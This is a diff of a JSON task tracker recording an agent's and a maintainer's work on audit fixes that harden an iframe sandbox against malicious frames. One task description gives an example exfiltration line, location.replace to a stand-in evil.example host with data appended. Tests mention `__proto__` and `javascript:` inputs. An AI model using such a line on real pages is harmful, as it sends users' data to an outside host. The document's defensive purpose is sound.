@@ -10477,7 +10477,7 @@
       "description": "Audit S1 and B8 ([the audit](docs/codebase-audit.md)), as [the sandbox's design](docs/running-components-in-the-sandbox.md), decision 10, and [its protocol](docs/sandbox-protocol.md), decision 5, now say (CMD-269, revised with the maintainer while starting this task).\n\nA strict frame can navigate itself (`location.replace(\"https://evil.example/?\" + data)`). The data in the URL is stopped only by the host page's `frame-src`. What the sandbox must stop is admitting what loads next: `frameUse` says hello on every `load` (`npm-packages/sandbox/src/use.ts`), so the foreign page is given a port, the code, the part with the document's inputs, and `host`. The page and compile frames say hello once (`pages.ts`, `host/runtime.ts`), so they admit nothing, but a second load leaves them hung until the ping's timeout.\n\n## Decided\n- A parent says `hello` only after a load it started, by giving the frame its `src`.\n- **A use frame**, on a load it didn't start (a self-navigation, or its element moved, which the parent can't tell apart), gives nothing to what loaded and sets its `src` again, then connects after that load as today. Three such loads within 10 s fail the frame: removed, its fallback shown (W118). (Not \"with no `ready` between them\", as first written: a restarted frame says `ready` before its code navigates again, so that never stops a loop.)\n- **The page and compile frames** are greeted once. A second load fails them at once, with an error. No replay.\n- A frame whose `ready` names another sandbox version is reported with the reason `version`, not as unloaded.\n- The host's page MUST have `frame-src` naming the frames' origin (docs/hosting.md, decision 10), and `runCheck` probes for it.\n\n## Change\n- A small helper that makes a frame (the `sandbox` and `allow` attributes) and tells a load it started from any other, used by `frameUse`, `framePage` and the compile frame.\n- Reloads no longer leak a channel and a `serveHost` listener in `#frameEvents`.\n- The `version` reason; `runCheck`'s self-navigation probe.\n\n## Tests\nBrowser tests in Chrome and WebKit:\n- a strict use frame that navigates itself gets no second hello on what loaded, and is back on its own document; one that keeps navigating shows its fallback;\n- a use frame whose element is moved boots again and draws;\n- a page frame that navigates itself fails with an error;\n- `runCheck` fails on a page without `frame-src`.\n",
       "requirements": [],
       "use_cases": [],
-      "status": "in_review",
+      "status": "done",
       "dependencies": [
         "01a1f7b7-53d9-7730-bb1c-8cd7c96932d9"
       ],
@@ -10488,7 +10488,7 @@
         "npm-packages/sandbox/test/strict.test.ts"
       ],
       "created_at": "2026-11-20T06:49:09Z",
-      "updated_at": "2026-11-24T20:58:13Z",
+      "updated_at": "2026-11-24T22:20:44Z",
       "created_by": "Hakan Serce",
       "updated_by": "claude:e419ca2a",
       "sprint_history": [
@@ -10509,15 +10509,35 @@
         }
       ],
       "review_requested_at": "2026-11-24T20:58:13Z",
-      "review_state": "waiting",
       "notes": [
         {
           "at": "2026-11-24T20:58:13Z",
           "kind": "review",
           "text": "CR-122: A frame that navigates itself is not admitted again",
           "by": "claude:e419ca2a"
+        },
+        {
+          "at": "2026-11-24T22:20:26Z",
+          "kind": "note",
+          "text": "Approved: in CR-122 (round 1)",
+          "by": "Hakan Serce"
+        },
+        {
+          "at": "2026-11-24T22:20:44Z",
+          "kind": "outcome",
+          "text": "Approved in CR-122: only a load the parent started is greeted; a use frame is reloaded, failing after three in 10 s; page and compile frames fail at once; runCheck probes frame-src.",
+          "by": "claude:e419ca2a"
         }
-      ]
+      ],
+      "reviews": [
+        {
+          "from": "2026-11-24T20:58:13Z",
+          "to": "2026-11-24T22:20:26Z",
+          "outcome": "approved"
+        }
+      ],
+      "completed_at": "2026-11-24T22:20:44Z",
+      "completed_by": "claude:e419ca2a"
     },
     {
       "id": "01a1f7b7-53d9-7730-bb1c-8cdabf3508ee",
@@ -10543,7 +10563,7 @@
         "npm-packages/sandbox/src/protocol/messages.ts"
       ],
       "created_at": "2026-11-20T06:49:09Z",
-      "updated_at": "2026-11-24T21:33:10Z",
+      "updated_at": "2026-11-24T22:21:50Z",
       "created_by": "Hakan Serce",
       "updated_by": "claude:e419ca2a",
       "sprint_history": [
@@ -10554,7 +10574,7 @@
       ],
       "sprint": "Audit - Nov19",
       "number": 272,
-      "started_at": "2026-11-24T20:58:19Z",
+      "started_at": "2026-11-24T22:21:27Z",
       "started_by": "claude:e419ca2a",
       "commit": "32b92abaadc855a1a00b26199f3ea50ed4d44aa4",
       "code_reviews": [
@@ -10563,16 +10583,35 @@
           "ref": "CR-123"
         }
       ],
-      "review_requested_at": "2026-11-24T21:33:10Z",
-      "review_state": "waiting",
       "notes": [
         {
           "at": "2026-11-24T21:33:10Z",
           "kind": "review",
           "text": "CR-123: A permissive frame gets only its own pack code",
           "by": "claude:e419ca2a"
+        },
+        {
+          "at": "2026-11-24T22:20:31Z",
+          "kind": "note",
+          "text": "Approved: in CR-123 (round 1)",
+          "by": "Hakan Serce"
+        },
+        {
+          "at": "2026-11-24T22:21:50Z",
+          "kind": "review",
+          "text": "Approved in CR-123 (round 1); the loop claimed it back with nothing left to do. Nothing new to check.",
+          "by": "claude:e419ca2a"
         }
-      ]
+      ],
+      "reviews": [
+        {
+          "from": "2026-11-24T21:33:10Z",
+          "to": "2026-11-24T22:20:31Z",
+          "outcome": "approved"
+        }
+      ],
+      "review_requested_at": "2026-11-24T22:21:50Z",
+      "review_state": "waiting"
     },
     {
       "id": "01a1f7b7-53d9-7730-bb1c-8cdb963a2c49",
@@ -10588,7 +10627,7 @@
       "description": "Audit S3 and B8 ([the audit](docs/codebase-audit.md)), as [the sandbox's protocol](docs/sandbox-protocol.md), decision 6, now says (CMD-269, narrowed with the maintainer while starting this task).\n\n`connectCompiler` kept pending requests by component name (`npm-packages/sandbox/src/protocol/compiler.ts`). A document and one of its examples can define a component of one name, and both are compiled at once. One request then got the other's code, which `compiledWith` cached under the wrong source's key, and the other never settled, so the view never rendered. The compile frame also had no timeout after `ready`.\n\n## Decided\n- `compile`, `compiled` and `failed` carry an `id`, the host's own count (protocol version 4, with CMD-272's `pack`). An answer settles only the request with its `id`, and one with no request waiting is dropped.\n- A compile not answered within 30 s of the host's awake time fails, and its component's uses show their fallbacks. The compile frame isn't pinged: this stands for it.\n- **Not done, as first written, since it fixes nothing ids on compiles don't:**\n  - ids on `image` and `fetched`: the same URL wants the same file, and only the host's page answers;\n  - a newer request rejecting an older one;\n  - a shared request/answer helper, which would have had one user.\n- `host` calls (`host-api.ts`) are already matched by id and get no timeout.\n\n## Tests\n- Two compiles of one name each get their own code, answered out of order.\n- An answer with an unknown `id` is dropped.\n- A compile that never answers fails after the timeout.\n- A document and an example defining one name both render, in frame and host mode.\n",
       "requirements": [],
       "use_cases": [],
-      "status": "in_review",
+      "status": "done",
       "dependencies": [
         "01a1f7b7-53d9-7730-bb1c-8cd7c96932d9"
       ],
@@ -10599,7 +10638,7 @@
         "npm-packages/sandbox/src/compiled-cache.ts"
       ],
       "created_at": "2026-11-20T06:49:09Z",
-      "updated_at": "2026-11-24T22:05:04Z",
+      "updated_at": "2026-11-24T22:21:00Z",
       "created_by": "Hakan Serce",
       "updated_by": "claude:e419ca2a",
       "sprint_history": [
@@ -10620,15 +10659,35 @@
         }
       ],
       "review_requested_at": "2026-11-24T22:05:04Z",
-      "review_state": "waiting",
       "notes": [
         {
           "at": "2026-11-24T22:05:04Z",
           "kind": "review",
           "text": "CR-124: Compile requests matched by id, with a timeout",
           "by": "claude:e419ca2a"
+        },
+        {
+          "at": "2026-11-24T22:20:38Z",
+          "kind": "note",
+          "text": "Approved: in CR-124 (round 1)",
+          "by": "Hakan Serce"
+        },
+        {
+          "at": "2026-11-24T22:21:00Z",
+          "kind": "outcome",
+          "text": "Approved in CR-124: compile requests matched by id, each failing after 30 s; protocol version 4.",
+          "by": "claude:e419ca2a"
         }
-      ]
+      ],
+      "reviews": [
+        {
+          "from": "2026-11-24T22:05:04Z",
+          "to": "2026-11-24T22:20:38Z",
+          "outcome": "approved"
+        }
+      ],
+      "completed_at": "2026-11-24T22:21:00Z",
+      "completed_by": "claude:e419ca2a"
     },
     {
       "id": "01a1f7b7-53d9-7730-bb1c-8cdcc53abb15",
@@ -10644,7 +10703,7 @@
       "description": "Audit S16, S17 and the shape checks of S28 ([the audit](docs/codebase-audit.md)), as [the sandbox's design](docs/running-components-in-the-sandbox.md), decision 10, and [its protocol](docs/sandbox-protocol.md), decision 7, now say (CMD-269, narrowed to the threats while starting this task).\n\n## Decided\n- **`set`, frame mode included:** only an input that is an own key of the document's inputs (`Object.hasOwn`) and that some use in the trees and splices sent binds (`PageInputs`), as host mode checks a use frame's `set`. Before, it was `input in inputs` (`npm-packages/sandbox/src/pages.ts`).\n- **`link`:** a string, through `safeUrl(url, schemes)` in the parent (`protocol/parent-end.ts`); `@compmd/render` exports `safeUrl`. `ViewEvents.link`'s doc says the URL and its timing come from the frame's code, so the host shows the reader the URL before anything opens.\n- **`pong`:** a whole number with `answered < n <= sent`.\n- **`error`, `rendered`, `size` and `serveHost`'s calls** checked before use, and a reported size kept from 0 to `MAX_SIZE`.\n- **Not done, as first written:** one guard table per direction, with the unions and `isMessage` derived from it (audit A1). It tidies the code but fixes no threat: each message is checked where it is read.\n\n## Tests\nFrom a fake frame's port:\n- `set` of `__proto__` is refused, and so is a page frame's `set` of a declared input no use binds;\n- `link` with `javascript:` is dropped;\n- `pong {n: Infinity}` doesn't stop a hung frame being reported;\n- a malformed `error` reaches no host callback.\n",
       "requirements": [],
       "use_cases": [],
-      "status": "in_progress",
+      "status": "in_review",
       "dependencies": [
         "01a1f7b7-53d9-7730-bb1c-8cd7c96932d9"
       ],
@@ -10656,7 +10715,7 @@
         "npm-packages/sandbox/src/use.ts"
       ],
       "created_at": "2026-11-20T06:49:09Z",
-      "updated_at": "2026-11-24T22:14:56Z",
+      "updated_at": "2026-11-24T22:30:10Z",
       "created_by": "Hakan Serce",
       "updated_by": "claude:e419ca2a",
       "sprint_history": [
@@ -10668,7 +10727,24 @@
       "sprint": "Audit - Nov19",
       "number": 274,
       "started_at": "2026-11-24T22:07:48Z",
-      "started_by": "claude:e419ca2a"
+      "started_by": "claude:e419ca2a",
+      "commit": "87a2b7f4526d5d6ea57f094fed6a07e173460f9a",
+      "code_reviews": [
+        {
+          "id": "01a20fae-4b5b-77f1-bae7-b999266bae99",
+          "ref": "CR-125"
+        }
+      ],
+      "review_requested_at": "2026-11-24T22:30:10Z",
+      "review_state": "waiting",
+      "notes": [
+        {
+          "at": "2026-11-24T22:30:10Z",
+          "kind": "review",
+          "text": "CR-125: What a frame sends is checked before the parent acts on it",
+          "by": "claude:e419ca2a"
+        }
+      ]
     },
     {
       "id": "01a1f7b7-53d9-7730-bb1c-8cdd28516bbc",
@@ -10754,7 +10830,7 @@
       "description": "Audit S18 ([the audit](docs/codebase-audit.md)), as [the sandbox's design](docs/running-components-in-the-sandbox.md), decision 10 and Q3, and [hosting](docs/hosting.md), H2, now say (CMD-269).\n\nThe frame runtime believes its parent (`npm-packages/sandbox/src/frame/runtime.ts`, the hello listener). Served without `Content-Security-Policy: sandbox allow-scripts`, any site can embed `strict.html` without a `sandbox` attribute and run code in the origin that serves it. GitHub Pages ignores `_headers`, so the project's own site serves the frames that way.\n\n## Decided\n- The frame runtime refuses to start unless `self.origin === \"null\"`, whatever headers served it.\n- Where the host can set headers, it MUST serve the frame documents with `Content-Security-Policy: sandbox allow-scripts`. The runtime's check is what holds where it can't, such as Pages.\n\n## Change\n- The runtime check, saying why in the console.\n- The sandbox README and the hosting guide make the header a MUST where headers can be set.\n- `runCheck` reports a frame document served without the header.\n- The website keeps its frames on Pages, safe by the runtime's check. Whether it moves them to a host that honours `_headers` is a follow-up task, if wanted.\n\n## Tests\n- A frame document loaded in an iframe without `sandbox` doesn't answer hello.\n- The existing frames still start.\n",
       "requirements": [],
       "use_cases": [],
-      "status": "todo",
+      "status": "in_progress",
       "dependencies": [
         "01a1f7b7-53d9-7730-bb1c-8cd7c96932d9"
       ],
@@ -10763,7 +10839,7 @@
         "npm-packages/sandbox/README.md"
       ],
       "created_at": "2026-11-20T06:49:09Z",
-      "updated_at": "2026-11-24T20:11:50Z",
+      "updated_at": "2026-11-24T22:30:25Z",
       "created_by": "Hakan Serce",
       "updated_by": "claude:e419ca2a",
       "sprint_history": [
@@ -10773,7 +10849,9 @@
         }
       ],
       "sprint": "Audit - Nov19",
-      "number": 276
+      "number": 276,
+      "started_at": "2026-11-24T22:30:25Z",
+      "started_by": "claude:e419ca2a"
     },
     {
       "id": "01a1f7b7-53d9-7730-bb1c-8cdf8f727aa9",
